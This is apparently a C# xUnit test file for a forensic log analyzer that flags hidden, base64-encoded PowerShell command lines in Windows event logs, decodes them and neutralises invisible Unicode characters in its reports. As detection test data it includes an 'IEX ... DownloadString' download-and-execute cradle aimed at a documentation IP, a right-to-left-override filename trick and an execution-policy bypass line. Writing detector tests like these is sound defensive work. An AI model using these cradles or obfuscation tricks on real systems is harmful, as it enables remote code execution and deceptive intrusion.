using LogAnalyzer.Dfir.Analysis;
using LogAnalyzer.Dfir.Model;
using Xunit;
using static LogAnalyzer.Dfir.Tests.W11;

namespace LogAnalyzer.Dfir.Tests;

/// <summary>
/// Evaluation 2026-11-05 on the owner's station: "powershell -WindowStyle Hidden -EncodedCommand ..." was in the classic Windows PowerShell log
/// (400, HostApplication) and gave no finding, because only 4104 script blocks were read. Positive, benign and robustness cases.
/// </summary>
public class PowerShellCommandLineTests
{
    private const string Classic = "Windows PowerShell";

    private static string Details(string hostApp) =>
        "\tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1\n\tHostApplication=" + hostApp + "\n\tEngineVersion=5.1\n";

    private static TimelineEvent Start(double minute, string hostApp) => Ev(Classic, 400, minute, "", ("Data0", "Available"), ("Data1", "None"), ("Data2", Details(hostApp)));

    private const string Encoded = "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAEwAQQBfAEUAVgBBAEwAXwBFAE4AQwAnAA==";   // Write-Output 'LA_EVAL_ENC'

    [Fact]
    public void A_hidden_encoded_command_line_is_a_finding_with_the_command_decoded()
    {
        var cmd = @"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand " + Encoded;
        var f = Assert.Single(Correlation.Run([Start(0, cmd), Start(5, cmd)]), x => x.RuleId == "PS-CMDLINE-SUSPICIOUS");
        Assert.Equal("T1027", f.MitreTechniqueId);
        Assert.Contains("Write-Output 'LA_EVAL_ENC'", f.Description);
        Assert.Contains("2 ori", f.Description);
        Assert.Equal(2, f.SupportingEvidence.Count);
        Assert.Equal(Classification.Candidate, f.Classification);
    }

    private static string B64(string s) => Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(s));

    [Theory]
    [InlineData("powershell.exe -nop -w hidden -e ")]
    [InlineData("powershell.exe -ec ")]
    [InlineData("powershell.exe -EncodedCommand ")]
    public void Review_short_forms_and_the_decoded_text_are_scored(string prefix)
    {
        // review 2026-11-05: "-e"/"-ec" were decoded but never reported, and the decoded text was not scored
        var f = Assert.Single(Correlation.Run([Start(0, prefix + B64("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')"))]), x => x.RuleId == "PS-CMDLINE-SUSPICIOUS");
        Assert.Contains("DownloadString", f.Description);
    }

    [Fact]
    public void Review_direction_and_invisible_characters_are_shown_not_obeyed()
    {
        var cmd = "powershell.exe -w hidden -enc " + B64("Start-Process C:\\x\\\u202Egnp.exe\u200B") + " \u202Etxt.exe";
        var f = Assert.Single(Correlation.Run([Start(0, cmd)]), x => x.RuleId == "PS-CMDLINE-SUSPICIOUS");
        Assert.DoesNotContain('\u202E', f.Description);
        Assert.DoesNotContain('\u200B', f.Description);
        Assert.Contains("⟨U+202E⟩", f.Description);
        Assert.Equal("a⟨U+202E⟩b", Correlation.Visible("a\u202Eb"));
        Assert.Equal("plain", Correlation.Visible("plain"));
    }

    [Fact]
    public void Review2_tag_characters_and_lone_surrogates_are_shown_and_a_cut_never_splits_a_pair()
    {
        Assert.Equal("a⟨U+E0041⟩b", Correlation.Visible("a\U000E0041b"));
        Assert.Equal("a⟨U+D83D⟩b", Correlation.Visible("a\uD83Db"));
        Assert.Equal("a😀b", Correlation.Visible("a😀b"));
        var cmd = "powershell.exe -w hidden -enc " + Encoded + " " + new string('x', 300 - ("powershell.exe -w hidden -enc " + Encoded + " ").Length - 1) + "😀tail";
        var f = Assert.Single(Correlation.Run([Start(0, cmd)]), x => x.RuleId == "PS-CMDLINE-SUSPICIOUS");
        var d = f.Description;
        for (int i = 0; i < d.Length; i++)
        {
            if (char.IsHighSurrogate(d[i])) { Assert.True(i + 1 < d.Length && char.IsLowSurrogate(d[i + 1]), "lone high surrogate at " + i); i++; }
            else Assert.False(char.IsLowSurrogate(d[i]), "lone low surrogate at " + i);
        }
    }

    [Theory]
    [InlineData("powershell -w hidden -enc \"" + Encoded + "\"")]
    [InlineData("powershell /enc " + Encoded)]
    public void Review2_quoted_base64_and_the_slash_form_are_decoded(string cmd) =>
        Assert.Equal("Write-Output 'LA_EVAL_ENC'", Correlation.DecodedCommand(cmd));

    [Fact]
    public void Review_at_most_100_command_lines_are_listed_and_the_rest_are_counted()
    {
        var starts = Enumerable.Range(0, 130).Select(i => Start(i, $"powershell.exe -w hidden -enc {B64("Get-Item " + i)}")).ToArray();
        var cmd = Correlation.Run(starts).Where(x => x.RuleId == "PS-CMDLINE-SUSPICIOUS").ToList();
        Assert.Equal(101, cmd.Count);
        var summary = Assert.Single(cmd, x => x.Title.StartsWith("Alte 30 linii", StringComparison.Ordinal));
        Assert.Equal(20, summary.SupportingEvidence.Count);   // evaluation 2026-11-05: a summary without evidence was rejected and never reported
    }

    [Fact]
    public void An_ordinary_console_start_is_not_a_finding()
    {
        Assert.DoesNotContain(Correlation.Run([Start(0, @"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"), Start(1, "powershell.exe -NoProfile -File C:\\scripts\\backup.ps1")]),
            x => x.RuleId == "PS-CMDLINE-SUSPICIOUS");
    }

    [Theory]
    [InlineData("powershell -enc " + Encoded, "Write-Output 'LA_EVAL_ENC'")]
    [InlineData("powershell -e " + Encoded, "Write-Output 'LA_EVAL_ENC'")]
    [InlineData("powershell -EncodedCommand !!notbase64!!", "")]
    [InlineData("powershell -ExecutionPolicy Bypass", "")]
    public void The_encoded_command_is_decoded_only_when_it_is_base64(string cmd, string expected) =>
        Assert.Equal(expected, Correlation.DecodedCommand(cmd));

    [Fact]
    public void A_decoded_command_cannot_carry_control_characters_into_the_report()
    {
        var payload = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes("a\r\nb\u0007c"));
        Assert.Equal("a  b c", Correlation.DecodedCommand("powershell -enc " + payload));
    }

    [Fact]
    public void The_host_application_line_is_read_from_the_details_block_only()
    {
        Assert.Equal("powershell.exe -enc AAAA", Correlation.HostApplication(Details("powershell.exe -enc AAAA")));
        Assert.Equal("", Correlation.HostApplication("NewEngineState=Available"));
    }

    [Fact]
    public void Only_the_listed_script_blocks_take_an_id_so_the_numbering_has_no_holes()
    {
        var blocks = Enumerable.Range(0, 105).Select(i => Ev("Microsoft-Windows-PowerShell/Operational", 4104, i, "", ("ScriptBlockId", "b" + i),
            ("ScriptBlockText", $"IEX (New-Object Net.WebClient).DownloadString('http://x/{i}') -EncodedCommand AAAA"))).ToArray();   // 105 distinct blocks: the same text is one finding
        var found = Correlation.Run(blocks);
        var numbers = found.Select(x => int.Parse(x.FindingId.AsSpan(2))).OrderBy(n => n).ToList();
        Assert.Equal(Enumerable.Range(1, numbers.Count), numbers);
        Assert.Equal(5, Assert.Single(found, x => x.Title.StartsWith("Alte 5 scripturi", StringComparison.Ordinal)).SupportingEvidence.Count);
    }
}
